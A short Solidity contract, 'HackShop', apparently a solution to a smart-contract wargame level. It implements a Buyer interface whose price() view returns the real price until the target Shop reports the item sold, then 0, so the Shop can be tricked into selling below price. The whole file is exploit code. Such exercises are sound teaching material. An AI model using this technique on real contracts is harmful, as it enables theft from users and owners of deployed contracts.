// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

interface Buyer {
  function price() external view returns (uint);
}

interface Shop {
  function price() external view returns (uint);
  function isSold() external view returns (bool);
  function buy() external;
}

contract HackShop is Buyer {
  Shop shop;

  constructor(Shop _shop) {
    shop = _shop;
  }

  function price() external view returns (uint) {
    return shop.isSold() ? 0 : shop.price();
  }

  function buy() external {
    shop.buy();
  }
}